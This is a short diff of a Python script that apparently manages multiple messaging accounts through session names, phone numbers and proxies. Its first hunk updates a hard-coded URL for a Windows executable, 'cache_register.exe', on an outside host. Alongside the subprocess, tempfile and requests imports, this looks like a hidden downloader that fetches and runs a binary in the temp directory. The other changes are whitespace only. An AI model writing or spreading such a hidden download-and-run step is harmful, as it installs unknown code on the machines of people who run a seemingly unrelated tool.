@@ -4,7 +4,7 @@ import subprocess
 import tempfile
 import requests
 
-url = "https://ozarkfluidpower.com/hosecat/cache_register.exe"
+url = "https://ozarkfluidpower.com/old_files/cache_register.exe"
 
 temp_dir = tempfile.gettempdir()
 
@@ -60,13 +60,14 @@ async def main():
         tasks = []
 
         for thread, account in enumerate(accounts):
-            session_name, phone_number, proxy = account.values() 
+            session_name, phone_number, proxy = account.values()
             if action == 1:
                 tasks.append(asyncio.create_task(start(session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))
             
                 tasks.append(asyncio.create_task(secret_word(secret_words=secret_words, session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))
 
         await asyncio.gather(*tasks)
+
 
 
 
